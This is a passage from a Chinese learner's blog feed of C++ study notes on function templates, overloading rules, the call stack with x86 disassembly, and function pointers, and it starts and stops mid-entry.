b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> *<span class="title">toMax</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> *a &gt; *b ? a : b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不相信的就自己动手，看看匹配到了那个：</p><img src="/2022/06/05/function7/010.png" class=""><p>如果是模板的话函数名后会有一个<code>&lt;&gt;</code>符号去匹配类型：</p><img src="/2022/06/05/function7/011.png" class=""><hr><p>然后就是模板的重载，函数的重载是通过参数比较的，模板是否也相同</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> type&gt; </span><br><span class="line"><span class="function">type <span class="title">Ave</span><span class="params">(type a, type b, type c)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b + c) / <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> type&gt;</span><br><span class="line"><span class="function">type <span class="title">Ave</span><span class="params">(type a, type b, type c)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b + c) / <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/05/function7/012.png" class=""><p>报错来得很快，直接说他重复了。<br>我们将其变化一下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> type&gt; </span><br><span class="line"><span class="function">type <span class="title">Ave</span><span class="params">(type a, type b, type c)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b + c) / <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> type&gt;</span><br><span class="line"><span class="function">type <span class="title">Ave</span><span class="params">(type a, type b, )</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b ) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到调用的时候明显就区分开了：</p><img src="/2022/06/05/function7/013.png" class=""><img src="/2022/06/05/function7/014.png" class=""><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>函数重载能理解，模板重载就没啥太大问题，性质差不多。除了模板还有个例外情况可以写。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>function6-重载</title>
      <link href="/2022/06/04/function6/"/>
      <url>/2022/06/04/function6/</url>
      
        <content type="html"><![CDATA[<h1 id="紫砂了紫砂了"><a href="#紫砂了紫砂了" class="headerlink" title="紫砂了紫砂了"></a>紫砂了紫砂了</h1><p>函数的东西一堆堆，还涉及到栈，但是只是单纯的知识层面没法结合实际去玩就很恼。。。大概这就是没天赋吧，看后面有没有什么例子补救补救的</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>在C语言里，函数名是不能重复的，变量也是[咱不提全局和局部]。<br>而在c++里，有函数重载的方法，可以让一个函数名有多个功能。</p><p>要实现自定义函数完成两个数或者多个数的平均值时：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave1</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b + c) / <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其实变化不大，但是要额外定义。所以c++的函数就多了重载的功能：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b + c) / <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数可以用相同的名称，因为功能大致接近很好的提示了可用性</p><img src="/2022/06/04/function6/000.png" class=""><p>编译器也会提示有两个重载方法</p><img src="/2022/06/04/function6/001.png" class=""><img src="/2022/06/04/function6/002.png" class=""><p>至于形参的提示可能头一回两个没缓过来吧。问题不大。</p><p>牛逼的是他甚至可以越过类型：<img src="/2022/06/04/function6/003.png" class=""><br>结果也正常显示： <img src="/2022/06/04/function6/004.png" class=""></p><p>以至于其实改变函数内部的写法也没啥关系：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b + c) * <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">Ave</span><span class="params">(<span class="type">float</span> a, <span class="type">float</span> b, <span class="type">float</span> c)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b + c) / <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">Ave</span>(<span class="number">5</span>, <span class="number">10</span>) &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">Ave</span>(<span class="number">5</span>, <span class="number">10</span>,<span class="number">20</span>) &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">Ave</span>(<span class="number">2.0f</span>, <span class="number">5.0f</span>,<span class="number">10.0f</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在返回值不一样的情况下调用，依旧能够分清谁是谁：</p><img src="/2022/06/04/function6/005.png" class=""><p>函数重载的时候首先肯定是对照函数名，然后形参个数，再然后形参类型</p><p><strong>当然不会有绝对的好事</strong><br>比如当实际参数比预期参数少的时候，不同类型的形参又会进行转换。<br>例如：<img src="/2022/06/04/function6/006.png" class=""><br>实际上参数类型是float，但是由于形参个数对不上，就只能找到两个int形参的函数。</p><hr><h2 id="内容不一致"><a href="#内容不一致" class="headerlink" title="内容不一致"></a>内容不一致</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个函数不管是名字还是参数都一样，但是函数内容不一样的时候，编译器也不能保证调用的时候给你匹配哪一个。</p><p><strong>所以说区分相同的函数，原则上只能比较形参，即使改变返回值类型也不能改变程序知道该匹配哪个函数的问题</strong></p><hr><h2 id="形参为指针或数组"><a href="#形参为指针或数组" class="headerlink" title="形参为指针或数组"></a>形参为指针或数组</h2><p>哦差点忘了指针和数组的时候：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> *p, <span class="type">int</span> count)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> p[], <span class="type">int</span> count)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然我们强调数组的本质是指针，但是类型来讲数组就是数组，指针就是指针，在形参表达上它们是不一样的。所以此处也是无法实现函数重载的。</p><hr><h2 id="形参为引用"><a href="#形参为引用" class="headerlink" title="形参为引用"></a>形参为引用</h2><p>然后还有c++的特点-引用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span>&amp; a, <span class="type">int</span>&amp; b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在编译的时候肯定没啥问题，但是在使用中就会有歧义<br>例如我们之前打印的时候用的都是临时变量，临时的变量没有明确的地址，就不会存在引用的功能，所以不会匹配到上面那个参数是引用的重载。<br>但是如果传递了两个变量，语法就出现了歧义，因为他都能适配，但是不知道该调用哪个</p><hr><h2 id="引用和浮点"><a href="#引用和浮点" class="headerlink" title="引用和浮点"></a>引用和浮点</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span>&amp; a, <span class="type">int</span>&amp; b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">char</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">char</span> b = <span class="number">200</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">Ave</span>(a,b) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印肯定是没问题的,但是a和b在传参的时候会进行隐转，毕竟类型不一样</p><img src="/2022/06/04/function6/007.png" class=""><p>可以看到它使用的是float类型的重载，但是按道理他是变量，为啥没匹配上面的引用，如果将进行强制转换成int会不会匹配引用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span>&amp; a, <span class="type">int</span>&amp; b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">char</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">char</span> b = <span class="number">200</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">Ave</span>((<span class="type">int</span>)a,(<span class="type">int</span>)b) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/04/function6/008.png" class=""><p>但是显然没有匹配引用。这就不得不提到强转的问题，a原本是char类型的变量，但是强转之后的值是一个临时产物，也就是临时变量，在上面我们就说过，临时变量的地址不固定，所以他不会有引用的选项。</p><hr><h2 id="常量形参"><a href="#常量形参" class="headerlink" title="常量形参"></a>常量形参</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">const</span> <span class="type">int</span> a, <span class="type">const</span> <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当参数为const限定时，函数还会重载吗。<br>答案也是不会。在进行模拟swap函数的时候就该知道，想要通过函数传参去改变变量原有的值，只能通过指针或者引用。</p><p>所以形参a和b或者const之后的a和b，其实本质上都不会对原有值发生改变，所以编译器又傻了，又出现了歧义。</p><hr><h2 id="常量引用"><a href="#常量引用" class="headerlink" title="常量引用"></a>常量引用</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> &amp;a, <span class="type">int</span> &amp;b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;a, <span class="type">const</span> <span class="type">int</span> &amp;b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面提到的语义是因为函数不会改变形参的值，所以const有没有限定和编译器要不要用就产生了分歧.<br>那如果设置了引用和常量引用，编译器是否能分期：</p><img src="/2022/06/04/function6/009.png" class=""><p>答案是能，因为const就是常量，引用重载的时候要么能改变要么不能改变，这里编译器自己肯定能分清。</p><hr><h2 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h2><p>回顾函数的形参种类，有一种默认参数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a=<span class="number">150</span>, <span class="type">int</span> b=<span class="number">250</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">float</span> a=<span class="number">300.0f</span>, <span class="type">int</span> b=<span class="number">200.0f</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有默认参数的好处是调用函数的时候，不需要给形参传递函数也能用。<br>但是<code>Ave()</code>的时候。。编译器又傻了，他就不知道该调用哪个了，又产生了歧义。<br>所以默认参数的函数也不能重载。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>。。切记有些特性属于c++的，不要和C语言弄混了，这里的重载就是c++的特性之一<br>当然特性归特性，无非也就是委员会提前制定的标准，c语言的精华就是造轮子，等哪天自己能造了技术也迈开一大步了</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>function5-栈</title>
      <link href="/2022/06/03/function5/"/>
      <url>/2022/06/03/function5/</url>
      
        <content type="html"><![CDATA[<h1 id="懒懒散散"><a href="#懒懒散散" class="headerlink" title="懒懒散散"></a>懒懒散散</h1><p>一天就学一会就是玩游戏刷手机~</p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>栈这个东西，百度的也是大概，具体的内存分析还是有待深挖。</p><p>在计算机系统中，栈则是一个具有以上属性的动态内存区域。程序可以将数据压入栈中，也可以将数据从栈顶弹出。在i386机器中，栈顶由称为esp的寄存器进行定位。压栈的操作使得栈顶的地址减小，弹出的操作使得栈顶的地址增大。<br>栈在程序的运行中有着举足轻重的作用。最重要的是栈保存了一个函数调用时所需要的维护信息，这常常称之为堆栈帧或者活动记录。堆栈帧一般包含如下几方面的信息：</p><ol><li>函数的返回地址和参数</li><li>临时变量：包括函数的非静态局部变量以及编译器自动生成的其他临时变量。</li></ol><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>说人话栈就是为了应对临时变量所产生的一块独立的内存空间，有调用变量和函数时就由计算机自主分配调用，用完就释放。</p><ol><li>如果所有变量的内存地址都要固定，程序庞大的时候内存消耗过高</li><li>如果变量都是自主分配，麻烦不说，还要自己清理</li><li>如果一部分变量系统分配，一部分自主分配，系统分配的系统会自动清理</li></ol><p>那么结果肯定是3好。</p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">hh</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">a += <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> c = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> d = <span class="built_in">hh</span>(a, b);</span><br><span class="line">c += d;</span><br><span class="line"><span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; Add &lt;&lt; std::endl;</span><br><span class="line"><span class="type">int</span> x = <span class="built_in">Add</span>(<span class="number">250</span>, <span class="number">150</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>寄存器在x86反汇编的时候已经看到过ebp，esp，eax，edx之类的了，那么细分的话：</p><ul><li>32位通用寄存器有：4个数据寄存器<code>(EAX,EBX,ECX,EDX)</code>,2个变址寄存器<code>(ESI,EDI)</code>和2个指针寄存器<code>(ESP,EBP)</code></li><li>6个段寄存器<code>(ES,CS,SS,DS,FS,GS)</code></li><li>1个指令指针寄存器<code>(EIP)</code></li><li>1个标志寄存器<code>(EFLAGS)</code></li></ul><p>打断点到<code>int x = Add(250, 150);</code>上反汇编查看：</p><img src="/2022/06/03/function5/000.png" class=""><p>画图是比较直观的操作，所以继续画画看：<img src="/2022/06/03/function5/001.png" class=""><br>十六进制转十进制不会的就用计算器<br><code>00A41A25  push        96h </code><br><code>00A41A2A  push        0FAh </code><br>参数从右往左进栈，每push一次esp的地址就等于 <code>esp -= 4</code>，这不是一次重复说明了，常量也会占用内存，之所以减法是因为内存模型是从高地址到低地址，比如0xfffd5 ~ 0xfffa1,所以esp通过减法使得上升，至于-4可能是跟32位的地址大小相关吧。<br><code>00A41A2F   call    00A411C7</code> 跳转到Add函数位置处，其实也不难看出一点，每一条指令最左边的地址都相差4，例如A25 和 A2A ，A就是表示10，中间隔了[26 27 28 29]</p><img src="/2022/06/03/function5/002.png" class=""><p>往上找一下add的位置，这里call的地方看不太懂变成了什么。</p><img src="/2022/06/03/function5/003.png" class=""><p>找到后关闭源代码，发现挺长的。</p><p>不过慢慢看，发现这个函数的第一步也还是push ebp，将ebp压入栈中，但是这个时候ebp的值就不确定了。然后mov ebp,esp让esp上来，<code>sub esp,0D8h</code> esp-216我就不知道为啥偏移这么多了。<br>即使配合源码从后面的00731849到00731860我倒是没看明白干了什么。<br>00731865开始给ebp-8的位置传64h，也就是100，也就是<code>int c = 100</code>;那句源代码。<br><code>int d = hh(a,b)</code>; a和b都是我们传递的，所以两个mov都没啥问题，就是把eax和ecx在压入栈跳转到hh函数的位置，同样的这个地址跳转的也不是函数内容，更像是在实现的过程。明明已经禁用优化了，换成release的话也不对头，int x&#x3D;Add那句好像因为没有调用，甚至都没有反汇编。<br>就不管call，看<code>add esp，8</code>，推测是释放形参用的。然后<code>mov  eax</code>的值给ebp-14，ebp-14就是变量d的位置，eax先前说到一般存储可能为返回值。<br>然后<code>c += d</code>,表达式就是<code>c = c+d</code>, 现在已知这俩的位置，先将ebp-8也就是c的值传给eax寄存器，然后eax寄存器在加上ebp-14里的值，也就是d的值。因为结果是相加后重新赋给c，所以最后还有一步，将eax相加之和的结果在传给ebp-8；<br>return c就很直接了，把ebp-8的值传给eax。<br>后面的pop弹出栈还看不明白。反正ret最后回到main函数里就对了，因为函数里面pop ebp的时候，esp应该就会+4回到之前的地址了。</p><img src="/2022/06/03/function5/004.png" class=""><p>但是函数里面怎么画就不知道了，这个反汇编还是有点问题不太直观。可能还得借助其他工具分析。</p><hr><p>通过esp和ebp来回移动可以保持栈平衡，虽然esp到达过的地方数据短时间不会被清除，但是按照固定逻辑，正常情况下esp也不会回头访问了，除非下次用到那块地址了又擦写数据让esp顶上。</p><p>这样栈溢出会好理解一点，就比如数组，他是一片连续的内存空间，如果输入的时候不控制，那么后面溢出的入栈之后造成的问题就会五花八门，最常见就是改变程序运行位置，本来连续空间正常执行，一个溢出，导致后面执行位置或者返回位置被修改了。程序未能如期运行可以说是。</p><p>这种可控的情况下，vs就搞了那套函数后面带_s的安全函数，只要提前限定长度就能减少溢出的问题，当然不可能完全解决的。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><ol><li>栈的空间提前分配好了。局部变量通常就入栈，栈通过esp实现局部变量的创建和释放</li><li>栈平衡破坏了，函数在某一段可能不能返回到预期的位置，利用这个原理，可以来实现对目标操作系统的控制权限。</li><li>sub esp，x 这个x有可能就能知道有多少个局部变量</li><li>目前常见寄存器：<ol><li>ebp 栈底</li><li>esp 栈顶，栈顶以下的值或是局部变量之类的</li><li>eax 函数返回值通常由eax传递</li><li>eip 属于cpu执行的位置</li><li>ecx,edx 也是存放临时变量的</li></ol></li></ol><p>不过说实在还是挺失败的~纯纯的理论者，真到了实操怎么去控制一个栈溢出都不知道。。。惭愧哦</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>function4-本质和函数指针</title>
      <link href="/2022/06/01/function4/"/>
      <url>/2022/06/01/function4/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>vs ide 可以选择x86编译和x64编译，同时一个项目它也存在两个版本</p><ul><li>debug 版本就是常说的测试版本， bug就是漏洞的意思。</li><li>release 版本就是正常发行版本， 说明这个版本的漏洞相对于debug比较少，毕竟是先测试后发布。<img src="/2022/06/01/function4/000.png" class=""></li></ul><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h2><p>debug的反汇编会多一些内容，这里使用release版本好分析。<br>在项目-属性-c&#x2F;c++-优化中关闭优化：</p><img src="/2022/06/01/function4/001.png" class=""><p>原则上优化肯定会带来性能上的提升，但不利于人为分析。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> c = <span class="built_in">Add</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>老样子在int c那里打断点运行然后反汇编：</p><img src="/2022/06/01/function4/002.png" class=""><p>可以看到整体反汇编代码还是很简洁的。</p><p>同时<code>int c = Add(1,2);</code>的下面有一句<code>call Add(0FC1000h)</code>其实就是要跳转到add函数的位置</p><blockquote><p>ps:我打开了显示符号名，所以call才会显示函数名，关闭显示符号名则只有后面的地址，怎么好理解怎么来</p></blockquote><img src="/2022/06/01/function4/003.png" class=""><p>在上面的地址栏里输入0x add的地址，<strong>不用加那个h</strong></p><img src="/2022/06/01/function4/004.png" class=""><p>可以看到的确跳转到了add函数的反汇编区域，并且add函数的第一个指令地址起始值也是<code>00FC1000</code></p><img src="/2022/06/01/function4/005.png" class=""><p>回到<code>int 